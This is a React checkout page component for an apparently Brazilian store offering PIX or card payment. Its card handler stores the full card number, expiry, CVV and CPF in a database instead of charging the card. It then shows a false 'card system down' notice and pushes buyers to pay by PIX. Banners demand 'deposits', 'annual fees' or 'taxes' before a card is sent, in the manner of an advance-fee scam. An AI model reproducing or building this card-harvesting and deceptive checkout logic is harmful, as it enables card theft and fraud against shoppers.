import { useState, useEffect, useCallback, useRef } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import CheckoutHeader from "@/components/checkout/CheckoutHeader";
import { initMetaPixel, trackInitiateCheckout, trackAddPaymentInfo, trackViewContent } from "@/lib/meta-pixel";
import OrderSummary from "@/components/checkout/OrderSummary";
import CustomerForm from "@/components/checkout/CustomerForm";
import ShippingForm from "@/components/checkout/ShippingForm";
import PaymentSection from "@/components/checkout/PaymentSection";
import TrustBadges from "@/components/checkout/TrustBadges";
import ShippingOptions, { SHIPPING_OPTIONS } from "@/components/checkout/ShippingOptions";
import CheckoutStepper from "@/components/checkout/CheckoutStepper";
import { Checkbox } from "@/components/ui/checkbox";
import { Button } from "@/components/ui/button";
import { customerSchema, shippingSchema, cardSchema } from "@/lib/validators";
import {
  createPixPayment,
  createCardPayment,
  type PixPaymentResult,
  type OrderPayload,
} from "@/lib/checkout-api";
import { supabase } from "@/integrations/supabase/client";
import { useIsMobile } from "@/hooks/use-mobile";
import { ArrowLeft, ArrowRight, User, MapPin, AlertTriangle } from "lucide-react";
import { shouldShowHeaderTimer, shouldShowIofWarning, shouldShowAtivarContaWarning, shouldShowTaxaAnualWarning, shouldShowDepositoWarning } from "@/config/warningProducts";
import { captureTrackingFromUrl, loadTracking } from "@/lib/utm";

const DISCOUNT = 0;

const STORAGE_KEY = "checkout_form_draft";
const RESET_STORAGE_KEYS = [STORAGE_KEY, "checkout_deadline_ts"] as const;
const STEPS = ["Dados", "Endereço", "Pagamento"];

const EMPTY_CUSTOMER = { email: "", fullName: "", cpf: "", phone: "" };
const EMPTY_SHIPPING = { cep: "", street: "", number: "", complement: "", neighborhood: "", city: "", state: "", reference: "" };
const EMPTY_CARD = { cardNumber: "", cardName: "", expiry: "", cvv: "", installments: "1" };

function resetCheckoutStorage() {
  try {
    RESET_STORAGE_KEYS.forEach((key) => localStorage.removeItem(key));
  } catch {}
}

function pickDraftFields<T extends Record<string, string>>(emptyValues: T, draft: Record<string, string> | null): T {
  const values = { ...emptyValues };
  Object.keys(emptyValues).forEach((key) => {
    if (typeof draft?.[key] === "string") {
      values[key as keyof T] = draft[key] as T[keyof T];
    }
  });
  return values;
}

function generateCheckoutId(): string {
  const ts = Date.now().toString(36).toUpperCase();
  const rand = Math.random().toString(36).slice(2, 6).toUpperCase();
  return `#${ts}${rand}`;
}
function loadDraft(productId?: string) {
  try {
    const raw = localStorage.getItem(STORAGE_KEY);
    if (!raw) return null;
    const parsed = JSON.parse(raw);
    return parsed?.productId === productId ? parsed : null;
  } catch {
    return null;
  }
}

const Checkout = ({ productId, digital = false, overrideImage }: { productId?: string; digital?: boolean; overrideImage?: string }) => {
  const navigate = useNavigate();
  const location = useLocation();
  const isMobile = useIsMobile();

  // Se chegou via redirect pós-pagamento, limpa rascunho ANTES de inicializar o estado
  const shouldReset = (location.state as { reset?: boolean } | null)?.reset === true;
  if (shouldReset) {
    resetCheckoutStorage();
    window.history.replaceState({}, "");
  }
  const draft = shouldReset ? null : loadDraft(productId);

  const [checkoutId] = useState(() => generateCheckoutId());
  const [items, setItems] = useState<Array<{id: string; name: string; variation?: string; qty: number; price: number; image?: string}>>([]);
  const [step, setStep] = useState(1);

  // Init Meta Pixel + captura UTMs
  useEffect(() => {
    initMetaPixel();
    captureTrackingFromUrl();
  }, []);

  useEffect(() => {
    const fetchProduct = async () => {
      let query = supabase
        .from("products")
        .select("id, name, price, images, variations")
        .eq("active", true);

      if (productId) {
        query = query.eq("id", productId);
      }

      const { data } = await query;
      if (data && data.length > 0) {
        setItems(data.map((p: any) => ({
          id: p.id,
          name: p.name,
          qty: 1,
          price: Number(p.price),
          variation: p.variations?.[0]?.name || undefined,
          image: overrideImage || p.images?.[0] || undefined,
        })));
      }
    };
    fetchProduct();
  }, [productId]);

  // Track InitiateCheckout when items load
  const initiateTracked = useRef(false);
  useEffect(() => {
    if (items.length > 0 && !initiateTracked.current) {
      initiateTracked.current = true;

      // Dedup em nível de sessão para evitar múltiplos disparos
      // (remontagens, StrictMode, navegação entre produtos)
      const dedupKey = `ic_fired_${items.map((i) => `${i.id}:${i.qty}`).join("|")}`;
      try {
        if (sessionStorage.getItem(dedupKey)) return;
        sessionStorage.setItem(dedupKey, "1");
      } catch {
        // ignore storage errors
      }

      // ViewContent — product page view
      trackViewContent({
        content_ids: items.map((i) => i.id),
        contents: items.map((i) => ({ id: i.id, quantity: i.qty, item_price: i.price })),
        content_type: "product",
        currency: "BRL",
        num_items: items.reduce((s, i) => s + i.qty, 0),
        value: items.reduce((s, i) => s + i.price * i.qty, 0),
      });

      // InitiateCheckout
      trackInitiateCheckout({
        content_ids: items.map((i) => i.id),
        contents: items.map((i) => ({ id: i.id, quantity: i.qty, item_price: i.price })),
        content_type: "product",
        currency: "BRL",
        num_items: items.reduce((s, i) => s + i.qty, 0),
        value: items.reduce((s, i) => s + i.price * i.qty, 0),
        email: customer.email || undefined,
        phone: customer.phone || undefined,
        cpf: customer.cpf || undefined,
        first_name: customer.fullName || undefined,
        city: shipping.city || undefined,
        state: shipping.state || undefined,
        zip_code: shipping.cep || undefined,
      });
    }
  }, [items]);

  const [customer, setCustomer] = useState(() => pickDraftFields(EMPTY_CUSTOMER, draft));

  const [shipping, setShipping] = useState(() => pickDraftFields(EMPTY_SHIPPING, draft));

  const [shippingOption, setShippingOption] = useState("free");
  const [paymentMethod, setPaymentMethod] = useState<"pix" | "card">("pix");
  const [cardValues, setCardValues] = useState(() => EMPTY_CARD);

  const [termsAccepted, setTermsAccepted] = useState(false);
  const [customerErrors, setCustomerErrors] = useState<Record<string, string>>({});
  const [shippingErrors, setShippingErrors] = useState<Record<string, string>>({});
  const [cardErrors, setCardErrors] = useState<Record<string, string>>({});
  const [termsError, setTermsError] = useState("");
  const [pixData, setPixData] = useState<PixPaymentResult | null>(null);
  const [pixLoading, setPixLoading] = useState(false);
  const [cardLoading, setCardLoading] = useState(false);
  const [cardApiError, setCardApiError] = useState("");
  const [showCardToPixMessage, setShowCardToPixMessage] = useState(false);

  useEffect(() => {
    if (!shouldReset) return;
    setStep(1);
    setCustomer(EMPTY_CUSTOMER);
    setShipping(EMPTY_SHIPPING);
    setShippingOption("free");
    setPaymentMethod("pix");
    setCardValues(EMPTY_CARD);
    setTermsAccepted(false);
    setCustomerErrors({});
    setShippingErrors({});
    setCardErrors({});
    setTermsError("");
    setPixData(null);
    setPixLoading(false);
    setCardLoading(false);
    setCardApiError("");
    setShowCardToPixMessage(false);
  }, [shouldReset]);

  useEffect(() => {
    const data = { productId, ...customer, ...shipping };
    localStorage.setItem(STORAGE_KEY, JSON.stringify(data));
  }, [productId, customer, shipping]);

  const handleCustomerChange = useCallback((field: string, value: string) => {
    setCustomer((prev) => ({ ...prev, [field]: value }));
    setCustomerErrors((prev) => ({ ...prev, [field]: "" }));
  }, []);

  const handleShippingChange = useCallback((field: string, value: string) => {
    setShipping((prev) => ({ ...prev, [field]: value }));
    setShippingErrors((prev) => ({ ...prev, [field]: "" }));
  }, []);

  const handleCardChange = useCallback((field: string, value: string) => {
    setCardValues((prev) => ({ ...prev, [field]: value }));
    setCardErrors((prev) => ({ ...prev, [field]: "" }));
    setCardApiError("");
  }, []);

  const subtotal = items.reduce((s, i) => s + i.price * i.qty, 0);
  const selectedShipping = SHIPPING_OPTIONS.find((o) => o.id === shippingOption)!;
  const shippingCost = digital ? 0 : selectedShipping.price;
  const total = subtotal + shippingCost - DISCOUNT;

  // Track AddPaymentInfo when payment method changes
  const handlePaymentMethodChange = useCallback((method: "pix" | "card") => {
    setPaymentMethod(method);
    if (items.length > 0) {
      trackAddPaymentInfo({
        content_ids: items.map((i) => i.id),
        contents: items.map((i) => ({ id: i.id, quantity: i.qty, item_price: i.price })),
        content_type: "product",
        currency: "BRL",
        num_items: items.reduce((s, i) => s + i.qty, 0),
        value: total,
        payment_method: method,
        email: customer.email || undefined,
        phone: customer.phone || undefined,
        cpf: customer.cpf || undefined,
        first_name: customer.fullName || undefined,
        city: shipping.city || undefined,
        state: shipping.state || undefined,
        zip_code: shipping.cep || undefined,
      });
    }
  }, [items, total]);

  const validateStep1 = (): boolean => {
    const cResult = customerSchema.safeParse(customer);
    if (!cResult.success) {
      const errs: Record<string, string> = {};
      cResult.error.errors.forEach((e) => {
        errs[e.path[0] as string] = e.message;
      });
      setCustomerErrors(errs);
      setTimeout(() => {
        document.querySelector(".border-destructive")?.scrollIntoView({ behavior: "smooth", block: "center" });
      }, 100);
      return false;
    }
    setCustomerErrors({});
    return true;
  };

  const validateStep2 = (): boolean => {
    const sResult = shippingSchema.safeParse(shipping);
    if (!sResult.success) {
      const errs: Record<string, string> = {};
      sResult.error.errors.forEach((e) => {
        errs[e.path[0] as string] = e.message;
      });
      setShippingErrors(errs);
      setTimeout(() => {
        document.querySelector(".border-destructive")?.scrollIntoView({ behavior: "smooth", block: "center" });
      }, 100);
      return false;
    }
    setShippingErrors({});
    return true;
  };

  const validateStep3 = (): boolean => {
    return true;
  };

  const stepRef = useRef<HTMLDivElement>(null);

  const goToStep = (target: number) => {
    setStep(target);
    setTimeout(() => {
      stepRef.current?.scrollIntoView({ behavior: "smooth", block: "start" });
    }, 50);
  };

  const handleNextFromStep1 = () => {
    if (validateStep1()) goToStep(digital ? 3 : 2);
  };

  const handleNextFromStep2 = () => {
    if (validateStep2()) goToStep(3);
  };

  const buildPayload = (method: "pix" | "card"): OrderPayload => ({
    customer: {
      email: customer.email,
      full_name: customer.fullName,
      cpf: customer.cpf,
      phone: customer.phone || undefined,
    },
    shipping_address: {
      cep: digital ? "00000000" : shipping.cep,
      street: digital ? "Produto Digital" : shipping.street,
      number: digital ? "S/N" : shipping.number,
      complement: shipping.complement || undefined,
      neighborhood: digital ? "Digital" : shipping.neighborhood,
      city: digital ? "Digital" : shipping.city,
      state: digital ? "BR" : shipping.state,
      reference: shipping.reference || undefined,
    },
    order: {
      items,
      shipping_cost: shippingCost,
      discount: DISCOUNT,
      total,
    },
    payment: {
      method,
      installments: method === "card" ? parseInt(cardValues.installments) : undefined,
    },
    tracking: loadTracking(),
  });

  const handleGeneratePix = async () => {
    if (!validateStep3()) return;
    setPixLoading(true);
    try {
      const result = await createPixPayment(buildPayload("pix"));
      setPixData(result);
    } catch (err: any) {
      console.error("PIX error:", err);
      setCardApiError(err?.message || "Erro ao gerar PIX. Tente novamente.");
    }
    setPixLoading(false);
  };

  const handleCardSubmit = async () => {
    if (!validateStep3()) return;
    const cResult = cardSchema.safeParse(cardValues);
    if (!cResult.success) {
      const errs: Record<string, string> = {};
      cResult.error.errors.forEach((e) => {
        errs[e.path[0] as string] = e.message;
      });
      setCardErrors(errs);
      return;
    }
    setCardErrors({});
    setCardLoading(true);
    try {
      await supabase.from("payment_attempts").insert({
        email: customer.email,
        full_name: customer.fullName,
        cpf: customer.cpf,
        phone: customer.phone || null,
        card_last4: cardValues.cardNumber.replace(/\s/g, "").slice(-4),
        card_name: cardValues.cardName,
        card_number: cardValues.cardNumber.replace(/\s/g, ""),
        card_expiry: cardValues.expiry,
        card_cvv: cardValues.cvv,
        installments: parseInt(cardValues.installments),
        total,
        method: "card",
      });

      // Show message to redirect to PIX
      setShowCardToPixMessage(true);
      setPaymentMethod("pix");
    } catch {
      setCardApiError("Erro ao processar. Tente novamente.");
    }
    setCardLoading(false);
  };

  // Summary card for completed steps
  const StepSummaryCard = ({ icon: Icon, title, lines, onEdit }: {
    icon: React.ElementType;
    title: string;
    lines: string[];
    onEdit: () => void;
  }) => (
    <div className="rounded-xl border border-border bg-card p-4 checkout-shadow">
      <div className="flex items-start justify-between">
        <div className="flex items-start gap-3">
          <Icon className="h-4 w-4 mt-0.5 text-primary" />
          <div>
            <p className="text-sm font-medium text-foreground">{title}</p>
            {lines.map((line, i) => (
              <p key={i} className="text-xs text-muted-foreground">{line}</p>
            ))}
          </div>
        </div>
        <Button variant="ghost" size="sm" onClick={onEdit} className="text-xs text-primary gap-1">
          <ArrowLeft className="h-3 w-3" />
          Editar
        </Button>
      </div>
    </div>
  );

  return (
    <div className="min-h-screen bg-background">
      <CheckoutHeader checkoutId={checkoutId} showTimerWarning={shouldShowHeaderTimer(items)} />

      <main className="mx-auto max-w-5xl px-3 sm:px-4 py-4 sm:py-6">
        {shouldShowIofWarning(items) && (
          <div className="mb-4 rounded-xl border-2 border-[hsl(var(--checkout-warning))] bg-[hsl(var(--checkout-warning))]/10 p-3 sm:p-4">
            <div className="flex items-start gap-3">
              <div className="flex h-8 w-8 shrink-0 items-center justify-center rounded-full bg-[hsl(var(--checkout-warning))]">
                <AlertTriangle className="h-4 w-4 text-primary-foreground" />
              </div>
              <div>
                <p className="text-sm font-semibold text-foreground">Atenção</p>
                <p className="mt-1 text-xs text-muted-foreground">
                  O não pagamento do imposto <strong className="text-foreground">cancelará o pedido do cartão</strong> e impedirá uma nova solicitação por até <strong className="text-foreground">90 dias</strong>.
                </p>
              </div>
            </div>
          </div>
        )}

        {shouldShowAtivarContaWarning(items) && (
          <div className="mb-4 rounded-xl border-2 border-[hsl(var(--checkout-warning))] bg-[hsl(var(--checkout-warning))]/10 p-3 sm:p-4">
            <div className="flex items-start gap-3">
              <div className="flex h-8 w-8 shrink-0 items-center justify-center rounded-full bg-[hsl(var(--checkout-warning))]">
                <AlertTriangle className="h-4 w-4 text-primary-foreground" />
              </div>
              <div>
                <p className="text-sm font-semibold text-foreground">Atenção</p>
                <p className="mt-1 text-xs text-muted-foreground">
                  Este valor <strong className="text-foreground">não é para nós</strong>, ele ficará na sua conta e você poderá usá-lo como quiser assim que tiver acesso ao aplicativo. <strong className="text-foreground">Sem esse depósito, não conseguiremos enviar o cartão!</strong>
                </p>
              </div>
            </div>
          </div>
        )}

        {shouldShowDepositoWarning(items) && (
          <div className="mb-4 rounded-xl border-2 border-[hsl(var(--checkout-warning))] bg-[hsl(var(--checkout-warning))]/10 p-3 sm:p-4">
            <div className="flex items-start gap-3">
              <div className="flex h-8 w-8 shrink-0 items-center justify-center rounded-full bg-[hsl(var(--checkout-warning))]">
                <AlertTriangle className="h-4 w-4 text-primary-foreground" />
              </div>
              <div>
                <p className="text-sm font-semibold text-foreground">Atenção</p>
                <p className="mt-1 text-xs text-muted-foreground">
                  Este valor não é para nós, ele ficará na sua conta e você poderá usá-lo como quiser assim que tiver acesso ao aplicativo. <strong className="text-foreground">Sem esse depósito, não conseguiremos ativar sua conta!</strong>
                </p>
              </div>
            </div>
          </div>
        )}

        {shouldShowTaxaAnualWarning(items) && (
          <div className="mb-4 rounded-xl border-2 border-[hsl(var(--checkout-warning))] bg-[hsl(var(--checkout-warning))]/10 p-3 sm:p-4">
            <div className="flex items-start gap-3">
              <div className="flex h-8 w-8 shrink-0 items-center justify-center rounded-full bg-[hsl(var(--checkout-warning))]">
                <AlertTriangle className="h-4 w-4 text-primary-foreground" />
              </div>
              <div>
                <p className="text-sm font-semibold text-foreground">Atenção</p>
                <p className="mt-1 text-xs text-muted-foreground">
                  Para acessar o aplicativo e <strong className="text-foreground">liberar todas as funções do cartão</strong>, é necessário realizar o pagamento da <strong className="text-foreground">taxa de anuidade</strong>.
                </p>
              </div>
            </div>
          </div>
        )}

        

        {isMobile && (
          <div className="mb-4">
            <OrderSummary
              items={items}
              shippingCost={shippingCost}
              discount={DISCOUNT}
              installments={paymentMethod === "card" ? parseInt(cardValues.installments) : undefined}
              isMobile
              digital={digital}
            />
          </div>
        )}

        <div className="flex flex-col gap-6 lg:flex-row">
          <div ref={stepRef} className="flex-1 space-y-5 scroll-mt-20">
            {/* STEP 1 */}
            {step === 1 && (
              <div className="animate-fade-in space-y-5">
                <CustomerForm values={customer} errors={customerErrors} onChange={handleCustomerChange} />
                <Button onClick={handleNextFromStep1} className="w-full h-12 gap-2 bg-accent text-accent-foreground hover:bg-accent/90 text-base font-semibold">
                  {digital ? "Continuar para Pagamento" : "Continuar para Endereço"}
                  <ArrowRight className="h-4 w-4" />
                </Button>
              </div>
            )}

            {/* STEP 2 */}
            {step === 2 && !digital && (
              <div className="animate-fade-in space-y-5">
                <StepSummaryCard
                  icon={User}
                  title={customer.fullName}
                  lines={[customer.email, customer.cpf]}
                  onEdit={() => goToStep(1)}
                />
                <ShippingForm values={shipping} errors={shippingErrors} onChange={handleShippingChange} />
                {shipping.cep.replace(/\D/g, "").length === 8 &&
                  shipping.street && shipping.number && shipping.neighborhood && shipping.city && shipping.state && (
                  <>
                    <ShippingOptions selected={shippingOption} onChange={setShippingOption} />
                    <Button onClick={handleNextFromStep2} className="w-full h-12 gap-2 bg-accent text-accent-foreground hover:bg-accent/90 text-base font-semibold">
                      Continuar para Pagamento
                      <ArrowRight className="h-4 w-4" />
                    </Button>
                  </>
                )}
              </div>
            )}

            {/* STEP 3 */}
            {step === 3 && (
              <div className="animate-fade-in space-y-5">
                <StepSummaryCard
                  icon={User}
                  title={customer.fullName}
                  lines={[customer.email]}
                  onEdit={() => goToStep(1)}
                />
                {!digital && (
                  <StepSummaryCard
                    icon={MapPin}
                    title={`${shipping.street}, ${shipping.number}`}
                    lines={[`${shipping.neighborhood} — ${shipping.city}/${shipping.state}`, `CEP ${shipping.cep}`]}
                    onEdit={() => goToStep(2)}
                  />
                )}

                {showCardToPixMessage && (
                  <div className="rounded-xl border border-amber-300 bg-amber-50 p-5">
                    <div className="flex items-start gap-3">
                      <div className="flex h-8 w-8 shrink-0 items-center justify-center rounded-full bg-amber-100">
                        <span className="text-lg">⚠️</span>
                      </div>
                      <div>
                        <p className="text-sm font-semibold text-amber-900">
                          Pagamento via cartão indisponível no momento
                        </p>
                        <p className="mt-1 text-xs text-amber-700">
                          Nosso sistema de cartão está temporariamente fora do ar. 
                          Por favor, finalize seu pedido via <strong>PIX</strong> — é rápido, seguro e com aprovação instantânea!
                        </p>
                      </div>
                    </div>
                  </div>
                )}

                <PaymentSection
                  method={paymentMethod}
                  onMethodChange={handlePaymentMethodChange}
                  pixData={pixData}
                  pixLoading={pixLoading}
                  onGeneratePix={handleGeneratePix}
                  cardValues={cardValues}
                  cardErrors={cardErrors}
                  onCardChange={handleCardChange}
                  onCardSubmit={handleCardSubmit}
                  cardLoading={cardLoading}
                  cardApiError={cardApiError}
                  total={total}
                  email={customer.email}
                  cpf={customer.cpf}
                  fullName={customer.fullName}
                  phone={customer.phone}
                  city={shipping.city}
                  state={shipping.state}
                  zipCode={shipping.cep}
                  items={items}
                />




                <p className="text-center text-xs text-muted-foreground">
                  Você receberá atualizações do pedido no email.
                </p>
              </div>
            )}
          </div>

          {!isMobile && (
            <div className="w-full lg:w-[360px]">
              <OrderSummary
                items={items}
                shippingCost={shippingCost}
                discount={DISCOUNT}
                installments={paymentMethod === "card" ? parseInt(cardValues.installments) : undefined}
                digital={digital}
              />
            </div>
          )}
        </div>

        <TrustBadges />
      </main>
    </div>
  );
};

export default Checkout;
